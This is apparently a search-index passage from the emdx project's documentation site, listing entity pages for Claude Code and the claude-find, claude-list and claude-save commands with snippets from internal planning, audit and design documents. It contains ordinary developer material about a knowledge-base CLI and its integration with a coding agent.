<p>...nverged on a clear principle: prime is a navigation aid, not a knowledge base (Claude Code's philosophy). Orientation over information.</p> </li> <li> <p>#6666 Prime Command Redesign: External Tool Research [1/4]   Section: 1. What Gets Injected at Session Start</p> <p>Claude Code's system prompt is not monolithic \u2014 it's ~110+ modular components conditionally assembled. The injection happens in two layers:</p> </li> <li> <p>#6665 context-research   Section: Comparison Matrix</p> Feature Continue Cursor Windsurf Augment Copilot Claude Code Pre-index Yes (deprecated) Yes Yes Yes (real-time) Yes No Embeddings... </li> <li> <p>#6664 Claude Code CLAUDE.md System \u2014 Deep Architecture Research   Section: 1. Session Start Injection: What Gets Loaded</p> <p>Claude Code assembles a modular system prompt from ~110+ discrete components, conditionally composed based on context. This is NOT a monolithic string \u2014 it's a plugin-style architecture.</p> </li> <li> <p>#6663 Prime Command Redesign: External Tool Research [2/4]   Section: 6. Problems with Too Much Context</p> <p>This is the most critical finding for comparison with Claude Code's CLAUDE.md approach:</p> </li> <li> <p>#6660 Prime Command Redesign Research [3/3]</p> </li> </ul>"},{"location":"entities/claude-code/#1-human-session-interactive-claude-code","title":"1. HUMAN SESSION (interactive Claude Code)","text":"<p>Detection: <code>EMDX_AUTO_SAVE</code> is unset. This is someone sitting down wondering \"what should I work on?\" They need orientation.</p> <ul> <li>#6654 Delegate synthesis [synthesis]   Section: Ranking the Angles <p>...ounding visceral. Shows the full loop in ~38 lines. Best for the primary audience (Claude Code users).</p> </li> <li> <p>Minimal Prose / Max Examples (Task 6) \u2014 Man-page style. Scannable in seconds. Best as a reference README (could work as the body after a narrative hoo...</p> </li> <li> <p>#6651 Delegate: Document #6643 (README Rewrite Strategy for 0.19.0): README Angle 1 - Compound Loop Narrative [1/10]   Section: Analysis</p> <p>Best for: Developers who already use Claude Code and feel the pain of sessions resetting. The compound loop is the most unique angle \u2014 no other tool pitches itself as \"AI memory that accumulates.\"</p> </li> <li> <p>#6597 Delegate: Research the first-5-minutes experience after 'pip install e [4/4]   Section: Executive Summary</p> <p>After <code>pip install emdx</code>, a new user faces significant friction before reaching their first \"aha moment\". The current experience is optimized for power users with Claude Code integration, not for someone discovering the tool for the first time.</p> </li> <li> <p>#6594 Delegate: Research what a great README rewrite for emdx would look lik [1/4]   Section: Proposed New Tagline</p> <ol> <li>\"Your AI's memory. And yours too.\"</li> </ol> </li> <li>\"A knowledge base for humans and AI agents.\"</li> <li>\"Save everything. Find anything. Delegate to Claude.\"</li> <li> <p>\"The knowledge base Claude Code reads, writes, and searches.\"</p> </li> <li> <p>#6591 Delegate: Research what an 'emdx init' command should do for first-run [2/4]   Section: Minimum Viable Init</p> <p>For Claude Code integration, add to your CLAUDE.md:   See: https://github.com/arockwell/emdx#claude-code-integration ```</p> </li> <li> <p>#6590 Delegate: Research what a great README rewrite for emdx would look lik [1/4]   Section: Proposed New Structure</p> </li> <li>Command output disappears; emdx output is searchable forever</li> <li>Parallel agent execution with automatic persistence</li> <li>Works standalone OR as a Claude Code extension</li> <li> <p>Full-text + semantic search</p> </li> <li> <p>#6586 Strategic Directions Analysis \u2014 Feb 2026   Section: The Honest Situation</p> <p>Key question from #6384: \"why would someone use emdx instead of just letting Claude Code manage its own memory?\"</p> </li> <li> <p>#6574 Delegate synthesis [synthesis]   Section: Common Themes</p> <ol> <li>AI-First Design: The <code>delegate.py</code> \u2192 <code>unified_executor.py</code> pipeline is the primary interaction path for Claude Code users, emphasizing the \"AI agents populate, humans curate\" philosophy.</li> </ol> </li> <li> <p>#6573 Delegate: List the 3 most important files in emdx/commands/ and say on [1/2]   Section: 3 Most Important Files in emdx/commands/</p> </li> <li> <p>#6550 Delegate: Commit the env-diag tooling (scripts/env-diag.sh and justfil [6/6]   Section: Actions Completed</p> </li> <li><code>scripts/env-diag.sh</code> - Fast environment fingerprinting script</li> <li><code>just diag</code> recipe for easy invocation</li> <li> <p><code>/env-diag</code> skill integration for Claude Code sessions</p> </li> <li> <p>#6546 Delegate Enhancement Gameplans [synthesis]   Section: Key Findings by Feature</p> </li> <li> <p>#6545 Delegate Enhancement Gameplans [1/5]   Section: Executive Summary</p> <p><code>emdx next</code> returns THE single next action for Claude Code to take, reducing decision fatigue at session start. It prioritizes finishing in-progress work, then ready tasks, then stale gameplans, with a fallback to <code>emdx prime</code>/<code>emdx status</code>.</p> </li> <li> <p>#6535 EMDX Future Directions: Agent-First Design [4/4]   Section: What Works Well Today</p> <p>...t session start \u2014 ready tasks, epics, recent docs</p> </li> <li>Delegate System: Replaces Claude Code's Task sub-agents with persistent, searchable output</li> <li>Task Queue: <code>task ready</code>, <code>task active</code>, <code>task done</code> \u2014 simple agent work coordination</li> <li> <p>Doc Context:...</p> </li> <li> <p>#6533 EMDX Future Directions: Agent-First Design [1/4]   Section: Executive Summary</p> <p>...models/, utils/), I've identified key friction points and opportunities for making Claude Code's workflow smoother. The current architecture is solid but could better address session handoff, context loss between sessions, task tracking gaps, and *...</p> </li> <li> <p>#6521 Delegate synthesis [synthesis]   Section: Common Themes</p> <ol> <li>Context-Aware Features: Both PRs aimed to make Claude Code sessions more context-aware (git state, filtered search, recent activity)</li> </ol> </li> <li> <p>Filter Mechanisms: Both proposed filtering by tags and recency \u2014 a pattern that shou...</p> </li> <li> <p>#6520 Delegate: Analyze FEAT-5: Re-implement smart priming (PR #446). The or [1/2]   Section: \ud83d\udd34 HIGH PRIORITY: Git Context</p> <p>Why It Matters:</p> </li> <li>Claude Code sessions are often task-oriented: \"fix the bug on this branch\"</li> <li>Knowing the current branch and recent commits provides immediate context</li> <li> <p>Open PRs give situational awareness about parallel work</p> </li> <li> <p>#6477 EMDX Task System: Unified Architecture and Simplification Strategy   Section: Implementation Roadmap</p> </li> <li>Update <code>emdx prime</code> to show only manual tasks</li> <li>Simplify task instructions in CLAUDE.md to ~10 lines</li> <li>Consider migration script for existing tasks</li> <li> <p>Test with Claude Code sessions</p> </li> <li> <p>#6473 EMDX Strategy: The Dual-Interface Knowledge Layer   Section: The Strategic Positioning</p> <p>In a landscape where every major AI coding tool (Claude Code, Cursor, Windsurf, Devin) now has persistent memory, EMDX's differentiation isn't about having persistence\u2014it's about who controls it and how it's accessed.</p> </li> <li> <p>#6464 Claude Document Templates Comprehensive Guide   Section: Overview</p> <p>These standardized templates ensure consistent document formatting when creating plans, implementations, analyses, and other documentation. They can be used directly with Claude Code or any documentation workflow.</p> </li> <li> <p>#6410 Delegate: Research and design structured metadata for emdx save and de [2/2]   Section: Tier 1: Essential (implement first)</p> <p>...\u2192executions | Which execution created this | Auto-detect | | <code>session_id</code> | TEXT | Claude Code session UUID | Auto-detect from env |</p> </li> <li> <p>#6408 EMDX Strategy v2: Dual-Interface Knowledge Layer   Section: Feature Priorities</p> <p>...al analysis of recommendations</p> </li> <li> </li> <li> </li> <li> </li> <li> </li> <li> </li> <li> <p>#6397 Delegate: Design a concrete 'dual-interface' architecture for EMDX whe [2/3]   Section: Recommended Approach: Layered Detection</p> <p>...ext() -&gt; bool:     \"\"\"Detect if running in an AI agent context.\"\"\"     # Check for Claude Code environment     if os.environ.get(\"CLAUDECODE\") == \"1\":         return True     # Check for generic agent marker     if os.environ.get(\"EMDX_AGENT_MODE\") == \"1\":...</p> </li> <li> <p>#6388 Delegate synthesis [synthesis]   Section: The Market Context</p> <ol> <li>Memory/Persistence as Table Stakes: Every major coding agent (Claude Code, Cursor, Windsurf, Devin) now has persistent state across sessions. This is no longer a differentiator\u2014it's expected.</li> </ol> </li> <li> <p>#6386 Delegate: Research how Claude Code specifically works as an agent \u2014 wh [3/4]   Section: Executive Summary</p> <p>This research examines Claude Code's architecture, constraints, and native features to understand how emdx can best integrate with or differentiate from Anthropic's native capabilities. The key findin...</p> </li> <li> <p>#6384 Delegate: Think critically about the strategy recommendations in doc # [4/4]   Section: 1. Identity Shift: \"Agent Workspace\" vs. \"Knowledge Base First\"</p> <p>...ight value the KB differently.</p> </li> <li> <p>The KB IS the moat: Agents are commoditizing. Claude Code, Cursor, Windsurf \u2014 they all run tasks. But a persistent, searchable, tagged knowledge base is rare. The agent workspace framing makes emdx sound like \"yet another...</p> </li> <li> <p>#6383 Strategy: EMDX as Agent Workspace   Section: The Shift</p> <ul> <li><code>delegate</code> \u2014 the core. Claude Code spawns work, gets results, persists them.</li> </ul> </li> <li><code>task</code> \u2014 Claude Code's work queue. The human reads it, Claude Code consumes it.</li> <li> <p><code>prime</code>/<code>status</code> \u2014 session boot...</p> </li> <li> <p>#6377 Codebase Bug Audit 2026-02-15 [5/10]   Section: EMDX Config Module Bug Audit</p> <p>Audit Date: 2026-02-15 Scope: emdx/config/, emdx/init.py, emdx/main.py, emdx/main.py Auditor: Claude Code</p> </li> <li> <p>#6375 Codebase Bug Audit 2026-02-15 [3/10]   Section: EMDX Services Bug Audit Report</p> <p>Date: 2026-02-15 Scope: <code>emdx/services/</code> and <code>emdx/services/cli_executor/</code> Auditor: Claude Code</p> </li> <li> <p>#6343 Delegate: Claude-Save Hook Implementation [12/12]   Section: Completed Implementation</p> <p>Successfully implemented a Claude Code hook that intercepts and validates <code>emdx save</code> commands.</p> </li> <li> <p>#6314 Delegate: analysis,architecture,active [13/15]   Section: System Overview</p> <p>...ion</p> </li> <li>FTS5 full-text search for fast content discovery</li> <li> <p>AI delegation via Claude Code integration</p> </li> <li> <p>#6233 Delegate: Dead Code Audit - emdx Project [2/14]   Section: Recommendations</p> <p>Generated by Claude Code - Dead Code Audit Date: 2026-02-14</p> </li> <li> <p>#6191 Delegate: analysis [3/3]   Section: Claude Code Integration</p> <p>EMDX is designed as a companion tool for Claude Code sessions:</p> </li> <li><code>emdx prime</code> - Get current work context at session start</li> <li><code>emdx delegate</code> - Replace Task tool sub-agents (results persist)</li> <li> <p><code>emdx task</code> - Work queue ma...</p> </li> <li> <p>#6185 Gameplan: Simplify Task System for Agent Use   Section: Problem</p> <p>The task system serves two conflicting purposes:</p> </li> <li>Delegate activity tracking \u2014 internal bookkeeping for <code>emdx status</code></li> <li> <p>Agent work queue \u2014 Claude Code creating/consuming work items across sessions</p> </li> <li> <p>#6172 Delegate: Analyze competing/overlapping concepts in emdx. The system h [8/15]   Section: Architectural Insight</p> <p>...th documents</p> </li> <li>Added workflows for orchestration (now removed)</li> <li>Added tasks for Claude Code-style task tracking</li> <li>Added cascade for idea-to-PR pipelines</li> <li> <p>Added delegate with its own task tracking</p> </li> <li> <p>#6111 EMDX Feature Sprint - 7 Parallel Builds   Section: Blocker Found &amp; Fixed</p> <p><code>emdx delegate</code> was broken when called from within a Claude Code session.</p> </li> <li> <p>#6092 PROZE/EMDX Feature Exploration - 10 Paths Deep Dive   Section: The Key Insight That Changes Everything</p> <p>The human UX matters for oversight and browsing, but the HOT PATH is: Claude Code \u2192 emdx CLI \u2192 stdout \u2192 Claude's context window</p> </li> <li> <p>#4843 Parallel Analysis (Reusable) - Parallel_Explore Synthesis   Section: Conclusion</p> <p>Synthesis of Alpha, Beta, Gamma, Delta analyses Generated by Claude Code workflow</p> </li> <li> <p>#4547 Tech Debt Parallel Fix - Tech_Debt_Parallel_Fix Synthesis   Section: Synthesis Log</p> <p>...d_tools\":[\"Read\",\"Write\",\"Bash\",\"Glob\",\"Grep\"],\"mode\":\"synchronous\"}} [00:02:30] \ud83d\ude80 Claude Code session started [00:02:33] \ud83e\udd16 Claude: I'll synthesize the tech debt fix results by first gathering information about what was accomplished across all tracks. Let me e...</p> </li> <li> <p>#4422 Tech Debt Discovery - Discovery Synthesis   Section: Synthesis of 5 outputs (error: FOREIGN KEY constraint failed)</p> <p>...LS\",\"Task\",\"TodoWrite\",\"WebFetch\",\"WebSearch\"],\"mode\":\"synchronous\"}} [23:46:52] \ud83d\ude80 Claude Code session started [23:46:56] \ud83d\udd0d Using tool: Grep [23:46:57] \ud83d\udd0d Using tool: Grep [23:46:59] \ud83d\udd0d Using tool: Grep [23:46:59] \ud83d\udcc4 Tool result:  Output too lar... <li> <p>#450 Claude Code Tag System Enhancement Ideas   Section: Claude Code Tag System Enhancement Ideas</p> </li> <li><code>gameplan</code>, <code>analysis</code>, <code>todo</code>, <code>in-progress</code>, <code>completed</code></li> <li><code>successful</code>, <code>failed</code>, <code>blocked</code>, <code>needs-review</code></li> <li> <p>`priority...</p> </li> <li> <p>#421 Claude Code Settings.json Cleanup Guide</p> <p>User's Claude Code settings files were accumulating historical permissions over time, making them \"huge\" with repetitive entries.</p> </li> <li> <p>#417 Claude Code Auto-Approved Tools Configuration Guide   Section: Alternative Methods:</p> <ul> <li>Interactive: Use <code>/permissions</code> command in Claude Code</li> </ul> </li> <li>Per-session: <code>claude --allowedTools Edit,Read,Write</code></li> <li> <p>Chat command: <code>/allowed-tools add Edit</code></p> </li> <li> <p>#292 Claude Export Wrapper Documentation</p> <p>A utility script to integrate Claude Code's <code>/export</code> command with emdx for saving and sharing conversations.</p> </li> <li> <p>#250 Claude-KB Competitive Analysis - Innovation Assessment   Section: What Makes Claude-KB Different</p> </li> <li>CLAUDE.md files: Direct integration with Claude Code</li> <li>Project awareness: Auto-detects Git projects</li> <li> <p>MCP compatibility: Works with Model Context Protocol</p> </li> <li> <p>#156 Claude-KB Project Recommendation - Split Strategy   Section: The Realization</p> <p>The key insight: When working with Claude Code, you need to build context through markdown files. <code>claude-save</code> makes this effortless.</p> </li> <li> <p>#170 Claude Thinking White Background - SOLUTION   Section: Claude Code Thinking Text White Background - SOLUTION</p> </li> <li>White/light background</li> <li>Black text</li> <li> <p>Poor contrast and readability</p> </li> <li> <p>#185 MCP-SETUP-GUIDE   Section: MCP Setup Guide - Gmail &amp; PostgreSQL Pro</p> </li> <li>Gmail MCP - Email access and management</li> <li> <p>PostgreSQL MCP Pro - Full database access with read/write capabilities</p> </li> <li> <p>#79 Terminal Colors Fix   Section: Terminal Colors Fix for Claude Code</p> </li> <li> <p>#33 Claude Output Templates Guide   Section: Claude Output Templates</p> </li> <li> <p>#5 Claude-Save Hook Implementation Game Plan   Section: Claude-Save Hook Implementation Game Plan</p> </li> <li> <p>#6 MCP Interactive Terminal Support   Section: MCP Servers for Interactive Terminal Apps (TUI/ncurses)</p> </li> <li> <p>#7 Claude Code Hooks Overview   Section: What Are Claude Code Hooks?</p> <p>Claude Code hooks are shell commands that execute automatically at specific points during Claude's operation. They allow you to:</p> </li> <li> <p>Intercept and modify commands before execution...</p> </li> <li> <p>#11 Claude Code Agents Plugin Mode Analysis &amp; Gameplan   Section: Problem Summary</p> <p>Claude Code agents are having trouble working with the clauding system after it moved to plugin mode. The root issue is that the system underwent a major architectural change (m...</p> </li>"},{"location":"entities/claude-code/#4-why-emdx-section-differentiation","title":"4. \"Why EMDX?\" Section (Differentiation)","text":""},{"location":"entities/claude-code/#2-delegatepy-1180-lines","title":"2. <code>delegate.py</code> (1,180 lines)","text":"<p>The AI orchestration engine \u2014 handles spawning Claude agents for parallel task execution, worktree isolation, PR creation, and result persistence, which is the primary way Claude Code users interact with emdx.</p>"},{"location":"entities/claude-code/#pr-description-summary","title":"PR Description Summary","text":"<p>The PR adds:</p>"},{"location":"entities/claude-code/#1-emdx-next-command","title":"1. <code>emdx next</code> Command","text":"<p>Purpose: Return THE single next action for Claude Code, eliminating decision paralysis at session start.</p>"},{"location":"entities/claude-code/#week-3-documentation-migration","title":"Week 3: Documentation &amp; Migration","text":""},{"location":"entities/claude-code/#6385-codebase-usage-pattern-analysis","title":"6385 \u2014 Codebase usage pattern analysis","text":""},{"location":"entities/claude-code/#6386-claude-code-architecture-research","title":"6386 \u2014 Claude Code architecture research","text":""},{"location":"entities/claude-code/#6387-competitive-landscape","title":"6387 \u2014 Competitive landscape","text":""},{"location":"entities/claude-code/#6388-strategy-synthesis-v1","title":"6388 \u2014 Strategy synthesis v1","text":""},{"location":"entities/claude-code/#6394-6398-human-vs-agent-interaction-patterns-dual-interface-design","title":"6394-6398 \u2014 Human vs agent interaction patterns, dual-interface design...","text":""},{"location":"entities/claude-code/#1-automated-workflow-tagging","title":"1. Automated Workflow Tagging","text":"<p>Claude Code could automatically apply workflow tags:</p>"},{"location":"entities/claude-code/#2-workflow-integration","title":"2. Workflow Integration","text":""},{"location":"entities/claude-code/#the-issue","title":"The Issue","text":"<p>Claude Code's \"thinking\" text appears with:</p>"},{"location":"entities/claude-code/#overview","title":"Overview","text":"<p>This guide covers setting up two MCP servers for Claude Code:</p>"},{"location":"entities/claude-code/#issue","title":"Issue","text":"<p>Terminal colors not displaying properly in Claude Code output.</p>"},{"location":"entities/claude-code/#purpose","title":"Purpose","text":"<p>These templates help ensure Claude Code formats documents consistently when creating plans, analyses, and other documents.</p>"},{"location":"entities/claude-code/#objective","title":"Objective","text":"<p>Create a Claude Code hook that automatically fixes claude-save command issues before execution, ensuring reliable document saving.</p>"},{"location":"entities/claude-code/#overview_1","title":"Overview","text":"<p>MCP servers enable Claude Code to drive interactive terminal applications, including ncurses-based TUIs (Text User Interfaces) that don't produce standard output.</p>"},{"location":"entities/claude-code/#related-entities","title":"Related Entities","text":"<ul> <li><code>~/.claude/settings.json</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=3.5)</li> <li><code>why it</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=3.5)</li> <li><code>emdx_auto_save</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=3.5)</li> <li><code>emdx agent</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=3.5)</li> <li><code>~/.claude/projects/&lt;project&gt;/memory/memory.md</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=3.5)</li> <li><code>git diff</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=3.2)</li> <li><code>documentation index management system</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=3.2)</li> <li><code>what claude</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=3.1)</li> <li><code>executive summary after</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=2.9)</li> <li><code>~/.claude/claude.md</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=2.8)</li> </ul>"},{"location":"entities/claude-find/","title":"claude-find","text":"<p>Type: tech_term | Mentioned in: 11 documents | First seen: 2025-07-07</p>"},{"location":"entities/claude-find/#documents-11","title":"Documents (11)","text":"<ul> <li>#250 Claude-KB Competitive Analysis - Innovation Assessment   Section: Market Gap Analysis <p>...knowledge in one searchable database</p> </li> <li>Full-Text Search: Find anything with <code>claude-find</code></li> <li> <p>Seamless Workflow: Works within existing Claude Code flow</p> </li> <li> <p>#156 Claude-KB Project Recommendation - Split Strategy   Section: Two Distinct Projects</p> <p>...ws Core Features:</p> </li> <li><code>claude-save</code> - Save any markdown file with one command</li> <li><code>claude-find</code> - Full-text search across everything  </li> <li><code>claude-note</code> - Quick capture for thoughts</li> <li><code>claude-clip</code> - Save from clipboard</li> <li> <p><code>claude-cmd</code> - Capture command outputs</p> </li> <li> <p>#176 Project Overview Documentation   Section: 2. Fish Shell Functions</p> <p>...Save markdown files to knowledge base</p> </li> <li><code>claude-list</code> - List knowledge entries</li> <li><code>claude-find</code> - Full-text search capabilities</li> <li><code>claude-view</code> - View documents with mdcat</li> <li><code>claude-recent</code> - Show recently accessed documents</li> <li> <p><code>claude-stats</code> - Display knowledg...</p> </li> <li> <p>#112 Clauding New Plugin Architecture README   Section: \ud83d\udcc1 New Structure</p> <p>...\u2500 functions/ \u2502   \u251c\u2500\u2500 claude-save.fish       # User commands (one per file) \u2502   \u251c\u2500\u2500 claude-find.fish      \u2502   \u251c\u2500\u2500 claude-view.fish \u2502   \u251c\u2500\u2500 ... (other commands) \u2502   \u2514\u2500\u2500 _clauding_internal/    # Internal helper functions \u2502       \u251c\u2500\u2500 _clauding_safe_insert.fish \u2502...</p> </li> <li> <p>#22 Full-Text Content Search Plan   Section: Implementation Details</p> </li> </ul> <pre><code># Current: searches title only\n# New: search title AND content\nclaude-find \"search term\"  # searches everywhere\nclaude-find title:\"search...\n\n- **#24** Clauding Architecture Refactor Plan\n  *Section: Current Pain Points*\n  &gt; - Must source 3+ files in exact order or commands fail\n- `claude-find` defined in 3 different files\n- Unclear which functions are \"enhanced\" vs \"scale\" vs standard\n- Files named `*-fixed.fish` suggest hasty bug fixes\n- Global functions...\n\n- **#11** Claude Code Agents Plugin Mode Analysis &amp; Gameplan\n  *Section: Phase 2: Testing &amp; Validation (Next 15 minutes)*\n  &gt; ...claude-check-setup &amp;&amp;\n    echo '# Test Document' | claude-pipe 'Test Doc' &amp;&amp;\n    claude-find 'Test' &amp;&amp;\n    echo '\u2705 All tests passed'\n\"\n</code></pre> <ul> <li>#16 Clauding Refactor Implementation Summary   Section: What Was Done <ol> <li>Merged Duplicate Functions</li> </ol> </li> <li>Combined 3 versions of <code>claude-find</code> into one with optional flags</li> <li><code>--snippets</code>, <code>--fuzzy</code>, <code>--project</code>, <code>--limit</code> options</li> <li> <p>Maintains backward compatibility</p> </li> <li> <p>#18 Clauding Project Gameplan - Updated   Section: \ud83d\udd04 Known Issues</p> <p>...iple files with duplicates</p> </li> <li>Must manually source 3+ files in exact order</li> <li><code>claude-find</code> defined in 3 different files</li> <li>Unclear enhanced vs scale vs standard functions</li> <li>Files named <code>*-fixed.fish</code> indicate hasty patches</li> <li> <p>Fish sourcing dependen...</p> </li> <li> <p>#150 Claude Command Structure Analysis   Section: Command Categories</p> <p>...1. Core CRUD Operations</p> </li> <li>claude-save - Create/Update documents from files</li> <li>claude-find - Read/Search documents</li> <li>claude-view - Read specific document</li> <li>claude-list - Read all documents</li> <li>claude-delete - Delete document (if exists)</li> </ul>"},{"location":"entities/claude-find/#1-enhance-claude-find-for-content-search","title":"1. Enhance claude-find for content search","text":""},{"location":"entities/claude-find/#related-entities","title":"Related Entities","text":"<ul> <li><code>functions/</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>easy installation</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>conf.d/clauding.fish</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>claude-view</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>_clauding_</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>*-fixed.fish</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>\ud83d\udd04 known issues</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>\u2705 what's working well</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>zero manual sourcing</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>type claude-save</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> </ul>"},{"location":"entities/claude-list/","title":"claude-list","text":"<p>Type: tech_term | Mentioned in: 8 documents | First seen: 2025-07-07</p>"},{"location":"entities/claude-list/#documents-8","title":"Documents (8)","text":"<ul> <li>#176 Project Overview Documentation   Section: 2. Fish Shell Functions <p>...claude-functions.fish`)</p> </li> <li><code>claude-save</code> - Save markdown files to knowledge base</li> <li><code>claude-list</code> - List knowledge entries</li> <li><code>claude-find</code> - Full-text search capabilities</li> <li><code>claude-view</code> - View documents with mdcat</li> <li> <p><code>claude-recent</code> - Show recently accessed docu...</p> </li> <li> <p>#31 Claude-List Improvement Plan v2   Section: Claude-List Improvement Plan</p> </li> <li> <p>#42 Fish Sourcing Issue Analysis   Section: Fish Function Sourcing Issue Analysis</p> </li> <li> <p>#43 Claude-List Simplification Plan   Section: Proposed Changes</p> </li> <li>Update the SQL query in <code>claude-list</code> function</li> <li>Adjust column formatting for better readability</li> <li>Add optional parameter for limit (default 50)</li> <li> <p>Consider adding <code>claude-list-all</code> for complete listing without limit</p> </li> <li> <p>#45 Claude-List Fix Plan   Section: Problem Statement</p> <p>The <code>claude-list</code> command appears to not return all documents that should be displayed. Users report missing documents when using this command.</p> </li> <li> <p>#18 Clauding Project Gameplan - Updated   Section: \ud83d\udd04 Known Issues</p> <ol> <li>Usability</li> </ol> </li> <li><code>claude-list</code> still shows complex grouped output (#2089) - TOP PRIORITY</li> <li>No delete functionality (#2111) - Plan created</li> <li> <p>No version history (#2113) - Plan created...</p> </li> <li> <p>#19 Clauding Project Gameplan   Section: \ud83d\udd04 Known Issues</p> <ol> <li>Usability</li> </ol> </li> <li><code>claude-list</code> still shows complex grouped output (#2089)</li> <li>No delete functionality (#2111)</li> <li>No version history (#2113)</li> <li> <p>Search limited to title/project, not content (#2112)</p> </li> <li> <p>#150 Claude Command Structure Analysis   Section: Command Categories</p> <p>...aude-find** - Read/Search documents</p> </li> <li>claude-view - Read specific document</li> <li>claude-list - Read all documents</li> <li>claude-delete - Delete document (if exists)</li> </ul>"},{"location":"entities/claude-list/#problem","title":"Problem","text":"<p>The current <code>claude-list</code> command shows documents grouped by project with complex formatting, making it hard to see what's new. Users want to quickly see their most recent documents in a simple, scannable format.</p>"},{"location":"entities/claude-list/#problem_1","title":"Problem","text":"<p>The <code>claude-list</code> and other claude commands fail with \"__claude_psql: Unknown command\" error when trying to source the fish functions.</p>"},{"location":"entities/claude-list/#4-implementation-steps","title":"4. Implementation Steps","text":""},{"location":"entities/claude-list/#related-entities","title":"Related Entities","text":"<ul> <li><code>\ud83d\udd04 known issues</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>\u2705 what's working well</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>title project modified</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>standard fish plugin structure</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>speed</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>short-term goals (2 weeks)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>shell support</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>search enhancements</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>rich content support</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>recent additions</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> </ul>"},{"location":"entities/claude-save/","title":"claude-save","text":"<p>Type: tech_term | Mentioned in: 9 documents | First seen: 2025-07-07</p>"},{"location":"entities/claude-save/#documents-9","title":"Documents (9)","text":"<ul> <li>#6790 Delegate: Execute the following document:</li> </ul>"},{"location":"entities/claude-save/#claude-save-hook-implemen-33","title":"Claude-Save Hook Implemen [3/3]","text":"<p>Section: Summary</p> <p>Successfully implemented the Claude-Save Hook as described in the game plan document. Here's what was done:</p> <ul> <li>#6343 Delegate: Claude-Save Hook Implementation [12/12]   Section: Files Created <ol> <li><code>~/.claude/hooks/claude-save-fixer.sh</code> - Main hook script</li> </ol> </li> <li>Intercepts all Bash commands via 